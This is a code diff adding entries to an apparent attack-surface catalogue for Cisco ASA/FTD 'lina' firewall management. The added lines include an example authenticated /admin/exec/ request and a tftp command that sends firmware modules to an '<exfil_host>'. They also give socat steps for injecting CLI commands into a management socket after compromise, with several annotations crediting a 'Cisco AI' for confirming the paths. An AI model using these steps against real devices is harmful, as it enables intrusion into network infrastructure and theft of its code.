@@ -851,10 +851,12 @@ LINA_API_SURFACE = {
             'for base64 creds; parse XML body for any inline secrets.'
         ),
         'xml_endpoints': [
-            '/admin/exec/<urlencoded-cli-command>',
+            '/admin/exec/<urlencoded-cli-command>',  # CONFIRMED: Cisco AI 2026-08-13
             '/admin/config',
             '/admin/logon',
         ],
+        'internal_ipc': '/tmp/mgmt.sock  (UNIX domain socket — confirmed Cisco AI 2026-08-13)',
+        'cli_exec_example': 'GET /admin/exec/show+running-config HTTP/1.1\r\nAuthorization: Basic <b64(user:pass)>',
     },
     'rest_api_ftd': {
         'mechanism': 'REST over HTTPS; JSON payloads; JWT bearer tokens',
@@ -877,7 +879,8 @@ LINA_API_SURFACE = {
         'module_extraction': (
             '/proc/$(pidof lina)/maps | grep ".so" → list loaded feature modules\n'
             'cp /proc/$(pidof lina)/fd/<n> /tmp/<module>.so 2>/dev/null\n'
-            'or: find /asa/lib/ -name "*.so" → smaller, focused analysis targets'
+            'find /asa/lib/ -name "*.so"  → confirmed path (Cisco AI 2026-08-13)\n'
+            'tftp -p -r /asa/lib/<module>.so <exfil_host>  → exfil individual modules'
         ),
     },
 }
@@ -892,9 +895,14 @@ LINA_IPC_SURFACES = {
         ),
     },
     'unix_sockets': {
-        'how_to_find': 'ls /var/run/*.sock  OR  ss -x  OR  netstat -x',
-        'content': 'management daemon IPC; may accept unauthenticated commands if socket perms misconfigured',
-        'attack': 'socat - UNIX-CONNECT:/var/run/<socket>  to probe raw protocol',
+        'how_to_find': 'ls /tmp/*.sock  OR  ss -x  OR  netstat -x',
+        'confirmed_path': '/tmp/mgmt.sock',  # Cisco AI confirmed 9:16 AM 2026-08-13
+        'content': 'management daemon IPC — CLI commands sent here by ASDM layer',
+        'attack': (
+            'socat - UNIX-CONNECT:/tmp/mgmt.sock  to inject raw CLI commands post-shell\n'
+            'No additional auth required if socket perms allow write from compromised process\n'
+            'Equivalent to: show running-config | ASDM /admin/exec/ endpoint'
+        ),
     },
     'message_queues': {
         'how_to_find': 'ipcs -q',
